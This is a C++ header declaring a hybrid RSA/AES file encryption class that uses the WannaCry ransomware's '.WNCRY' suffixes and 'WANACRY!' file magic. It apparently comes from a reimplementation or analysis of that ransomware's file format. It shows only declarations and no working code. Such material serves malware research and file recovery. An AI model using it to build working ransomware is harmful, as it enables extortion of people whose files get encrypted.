#pragma once
#include "EZRSA.h"
#include "EZAES.h"

#define EZH_SRCBUFFERSIZE	0x10000
#define EZH_IOBUFFERSIZE	0x100000

#define EZH_SUFFIX_CIPHER _T(".WNCRY")
#define EZH_SUFFIX_TEMP _T(".WNCRYT")

#define EZH_MAGIC "WANACRY!"
#define EZH_ENCRYPT  4

class EZHybrid
{
	PEZRSA m_pEncRSA;
	PEZRSA m_pDecRSA;
	PUCHAR m_InBuffer;
	PUCHAR m_OutBuffer;
public:
	EZHybrid();
	~EZHybrid();
	BOOL GenKey();
	BOOL ImportPublicKey(PUCHAR, ULONG);
	BOOL ImportPrivateKey(PUCHAR, ULONG);
	BOOL ImportPublicKey(LPCTSTR);
	BOOL ImportPrivateKey(LPCTSTR);
	BOOL Encrypt(LPCTSTR);
	BOOL Decrypt(LPCTSTR);
};

typedef EZHybrid* PEZHybrid;